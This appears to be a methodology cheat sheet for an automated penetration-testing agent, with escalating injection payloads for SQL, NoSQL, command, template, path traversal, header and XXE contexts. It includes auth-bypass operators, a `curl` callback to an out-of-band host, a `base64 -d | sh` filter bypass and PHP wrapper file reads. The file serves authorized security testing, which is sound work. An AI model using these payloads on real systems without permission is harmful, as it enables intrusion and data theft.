# injection bypass ladders

pick the ladder for the observed context; climb one rung per `campaign_test`.

## sql

1. baseline vs `'` / `"` / `)` to detect a syntax context and error.
2. boolean pair: `' AND 1=1-- -` vs `' AND 1=2-- -` → stable response diff.
3. time: `' AND SLEEP(5)-- -` vs `' AND SLEEP(0)-- -`, repeated to rule out jitter.
4. union: match column count (`ORDER BY n`), then extract `version()`/a known row.
5. filter bypass: inline comments `/**/`, case, whitespace alternatives, encoding,
   `CHAR()`/concat, alternate keywords, stacked queries where supported.
6. blind extraction: substring + boolean/time, scripted with `shell_exec` sqlmap
   once the injection point and oracle are proven.

## nosql (mongo-style)

- auth bypass: `{"user":"admin","pass":{"$ne":null}}`, `{"$gt":""}`.
- operator injection in query params: `user[$ne]=`, `user[$regex]=^a`.
- js/`$where` expression injection where allowed.

## command

1. separators: `;` `|` `||` `&&` `` `cmd` `` `$(cmd)` newline.
2. blind: `; curl http://<oast>` / `nslookup <oast>` → require `callback_oast`.
3. argument injection: `--option`, `-o`, filename that starts with `-`.
4. filter bypass: `${IFS}`, quotes, `$@`, concatenation, base64 `| base64 -d | sh`.

## template (ssti)

- probe by engine: `{{7*7}}` (jinja/twig), `${7*7}` (jsp/el/freemarker), `<%= 7*7 %>`
  (erb), `#{7*7}`. a rendered `49` confirms evaluation.
- escalate engine-specifically to object access / rce within scope; prefer an oob
  callback as proof.

## path / lfi

- `../` depth, encoded (`%2e%2e%2f`, double-encoded), null byte on legacy stacks.
- wrappers: `php://filter/convert.base64-encode/resource=...`, `data://`, `file://`.
- proof: read an authorized sentinel file whose content you can predict.

## header / host

- `Host:` override and `X-Forwarded-Host` / `X-Forwarded-For` → routing, cache
  poisoning, password-reset poisoning.
- crlf (`%0d%0a`) → header injection / response splitting → set-cookie or redirect.

## xxe (xml inputs)

- classic: external entity reading a sentinel file.
- blind/oob: parameter entity fetching an in-scope `callback_oast` url (require the
  callback).

## general

- decode/normalize thinking: the server may url-decode twice, unicode-normalize, or
  strip once — align the payload to what actually reaches the sink.
- one variable per attempt so the difference is attributable; record the parser
  behavior for each rejected rung before climbing.
